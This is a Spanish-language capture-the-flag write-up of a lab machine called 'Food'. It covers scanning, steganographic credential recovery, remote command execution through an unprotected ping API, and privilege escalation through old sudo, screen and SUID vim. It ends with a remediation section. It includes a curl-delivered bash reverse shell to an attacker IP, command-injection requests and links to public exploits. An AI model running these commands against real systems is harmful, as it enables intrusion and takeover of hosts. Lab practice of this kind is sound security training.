# Food
## Initial Scan
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:0c:0c:d9:5a:7d:be:e6:f4:3c:ed:10:51:49:4d:19 (RSA)
|   256 17:ce:03:3b:bb:20:78:09:ab:76:c0:6d:8d:c4:df:51 (ECDSA)
|_  256 07:8a:50:b5:5b:4a:a7:6c:c8:b3:a1:ca:77:b9:0d:07 (ED25519)
3306/tcp  open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, SupportsLoadDataLocal, Support41Auth, LongColumnFlag, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, ConnectWithDatabase, IgnoreSigpipes, LongPassword, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, ODBCClient, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: VE!Jms{&C\x1EZaZ\x0F[]IGW\x05
|_  Auth Plugin Name: mysql_native_password
9999/tcp  open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Fri, 14 Aug 2020 10:23:22 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Fri, 14 Aug 2020 10:23:21 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|_    king
15065/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Host monitoring
16109/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Fri, 14 Aug 2020 10:23:22 GMT
|     Content-Type: image/jpeg
|     JFIF
|     #*%%*525EE\xff
|     #*%%*525EE\xff
|     $3br
|     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     Y$?_
|     qR]$Oyk
|_    |$o.
46969/tcp open  telnet  Linux telnetd
```
## Enum
### Puerto 16109 
Aquí simplemente hay una foto, pero estos array me llevan a pensar que se ha usado steghide 
```
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
```
Vamos a extraer
```
steghide extract -sf photo.jpeg
Anotar salvoconducto: 
anota los datos extraidos em/"creds.txt".
```
Veamos esas creds 
```
pasta:pastaisdynamic
```
### Puerto 15065
```
/monitor (Status: 301)
```
Es un servicio de ping, probamos las fomas basicas de conseguir un RCE pero nada, veamos si podemos ver de algún modo que sucede detras a ver si encontramos alguna forma de bypassearlo, vemos un ain js con codigo ofuscado

```javascript
//Steve said I should obfuscate my code to make it better. I don't really understand but it works so meh
const _0x1a9d=['dmFsdWU=','I2hvc3RUb1Bpbmc=','dGVzdA==','SVAgYWRkcmVzcyBpbnZhbGlk','cXVlcnlTZWxlY3Rvcg==','UGluZ2luZzog','dGV4dENvbnRlbnQ='];(function(_0x365cb9,_0x1a9de5){const _0x4d6713=function(_0x1784af){while(--_0x1784af){_0x365cb9['push'](_0x365cb9['shift']());}};_0x4d6713(++_0x1a9de5);}(_0x1a9d,0x148));const _0x4d67=function(_0x365cb9,_0x1a9de5){_0x365cb9=_0x365cb9-0x0;let _0x4d6713=_0x1a9d[_0x365cb9];if(_0x4d67['NLdOOO']===undefined){(function(){let _0x525fb1;try{const _0x3f1d56=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x525fb1=_0x3f1d56();}catch(_0xc71f1){_0x525fb1=window;}const _0x4685a7='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x525fb1['atob']||(_0x525fb1['atob']=function(_0x255321){const _0x24c30f=String(_0x255321)['replace'](/=+$/,'');let _0x5e1a31='';for(let _0x4d6263=0x0,_0x55cd30,_0x4f9f3e,_0x1e913f=0x0;_0x4f9f3e=_0x24c30f['charAt'](_0x1e913f++);~_0x4f9f3e&&(_0x55cd30=_0x4d6263%0x4?_0x55cd30*0x40+_0x4f9f3e:_0x4f9f3e,_0x4d6263++%0x4)?_0x5e1a31+=String['fromCharCode'](0xff&_0x55cd30>>(-0x2*_0x4d6263&0x6)):0x0){_0x4f9f3e=_0x4685a7['indexOf'](_0x4f9f3e);}return _0x5e1a31;});}());_0x4d67['LCDJpm']=function(_0x16dbab){const _0x48165c=atob(_0x16dbab);let _0x25c165=[];for(let _0x2e78af=0x0,_0x1185f3=_0x48165c['length'];_0x2e78af<_0x1185f3;_0x2e78af++){_0x25c165+='%'+('00'+_0x48165c['charCodeAt'](_0x2e78af)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x25c165);};_0x4d67['znaolL']={};_0x4d67['NLdOOO']=!![];}const _0x1784af=_0x4d67['znaolL'][_0x365cb9];if(_0x1784af===undefined){_0x4d6713=_0x4d67['LCDJpm'](_0x4d6713);_0x4d67['znaolL'][_0x365cb9]=_0x4d6713;}else{_0x4d6713=_0x1784af;}return _0x4d6713;};async function pingHost(){const _0x25c165=document[_0x4d67('0x5')]('#outputSection');const _0x2e78af=document[_0x4d67('0x5')](_0x4d67('0x2'));const _0x1185f3=_0x2e78af[_0x4d67('0x1')];if(_0x1185f3!==undefined&&_0x1185f3!==''&&ValidateIPaddress(_0x1185f3)){_0x25c165[_0x4d67('0x0')]=_0x4d67('0x6')+_0x1185f3+'\x0a';const _0x27c227=await postData('/api/cmd','ping\x20-c\x204\x20'+_0x1185f3);_0x25c165['textContent']+=await _0x27c227['text']();}else{_0x25c165[_0x4d67('0x0')]=_0x4d67('0x4');}}function ValidateIPaddress(_0x23b8a0){if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4d67('0x3')](_0x23b8a0)){return!![];}return![];}
```
Toca desofuscar
```
async function pingHost() {
    const _0x25c165 = document[_0x4d67('0x5')]('#outputSection');
    const _0x2e78af = document[_0x4d67('0x5')](_0x4d67('0x2'));
    const _0x1185f3 = _0x2e78af[_0x4d67('0x1')];
    if (_0x1185f3 !== undefined && _0x1185f3 !== '' && ValidateIPaddress(_0x1185f3)) {
        _0x25c165[_0x4d67('0x0')] = _0x4d67('0x6') + _0x1185f3 + '\x0a';
        const _0x27c227 = await postData('/api/cmd', 'ping -c 4 ' + _0x1185f3);
        _0x25c165['textContent'] += await _0x27c227['text']();
    } else {
        _0x25c165[_0x4d67('0x0')] = _0x4d67('0x4');
    }
}
```
Esta función me permite hacer realmente un bypass pasando de el filtrado de la web y tirando directamente de la api

```
curl -X POST http://IP:15065/api/cmd --data "comando"
```
Ya tenemos nuestro RCE pasemos a una rev shell
```
curl -X POST http://10.10.222.16:15065/api/cmd --data "bash -i >& /dev/tcp/IP/4444 0>&1"
```
Ya tendriamos una shell como bread 

### MySql
Probamos el login por defecto
```
mysql -h IP -u root -p
> root
```
Y estamos dentro
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
mysql> use users;
mysql
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
+----------+---------------------------------------+
```
### Port 46969
Si nos conectamos usando telnet obtenemos el siguiente string
```
tccr:uwjsasqccywsg
```
Parecen creds encodeadas

Aplicamos rot 12 y: 
```
food:givemecookies
```
Mas creds, si nos logeamos tenemos un acc con el $PATH en blanco , lo restauramos y tenemos sesión como food
## Privesc
### Opcion 1 Pwfeedback
Cuando chekque en los usuarios si alguien podia ejecutar algo como sudo vi que me pedia las contraseñas y ponia * al escribir, esto implica que esta habilitado pwfeedback
Como no tenemos soccat no nos vale el de exploit db pero tenemos la version sin soccat
```
https://github.com/saleemrashid/sudo-cve-2019-18634
```
### Opcion 2 Screen 4.5.0
Podemos explotar el siguiente SUID
```
/usr/bin/screen-4.5.0
```
Aquí el exploit
```
https://www.exploit-db.com/exploits/41154
```
### Opcion 3 Vim Pass Change
El siguiente SUID nos da un arbitrary file write    
```
/usr/bin/vim.basic
```
Generamos una password y la añadimos a /etc/passwd para el user root
```
mkpasswd -m sha-512 sup3rsecr3tp4ssw0rdf0rr00t
```

## Flag Hunting
### Flag 1
Nos logeamos como pasta y ejecutamos lo siguiente
```
cat /home/food/.flag
```
Desde la API:
```
curl -X POST http://IP:15065/api/cmd --data "cat /home/food/.flag"
```
### Flag 2
Nos logeamos como pasta y ejecutamos lo siguiente
```
cat /var/flag.txt
```
O bien desde la API
```
curl -X POST http://IP:15065/api/cmd --data "cat /var/flag.txt"
```
### Flag 3
Cuando entramos en mysql en la tabla de usuarios

### Flag 4
Una vez somos root
```
cat /root/flag
```
### Flag 5
Siendo root podemos leerla sin problema:
```
/home/bread/flag
```
### Flag 6
Siendo root:
```
/home/tryhackme/flag7
```
### Flag 7
No encontrada
### Flag 8
No encontrada

# Analisís de la intrusión
### Insecure password managment
Esconder credenciales en un lugar accesible (aunque sea bajo esteganografia) es una mala práctica
### RCE via api
Establecer protecciones en la interaccion con la api solamente desde el lado del cliente permite a un atacatne malitencionado interacturar directamente con la api desprotegida y abusar de ella
### Default Creds
Se han mantenido las credenciales por defecto en el servicio mysql
### CVE-2019-18634
Pwfeedback esta habilitado en una versión antigua de sudo, lo que permite escalar privilegios 
### screen4.5.0
Hay un SUID habilitado en este binario que posee un exploit conocido
### vim.basic SUID
Hay un SUID activo en este programa lo que permite leer y editar archivos de manera atrbitraria

# Solucion
### RCE via api
La api permite un RCE no autenticado a cualquiera mediante curl, para solventar esto podemos pedir algun tipo de autenticacion para el uso de la misma, o limitar los comandos que la api puede ejecutar en nuestro sistema
### CVE-2019-18634 
Parchear la version de sudo o deshabilitar el pwfeedback
```
sudo mv /etc/sudoers.d/pwfeedback /etc/sudoers.d/pwfeedback.disabled
```
### screen4.5.0
Las opciones son parchear o deshabilitar el sistema
### vim.basic SUID
El parche seria deshabilitar el SUID en vim.basic
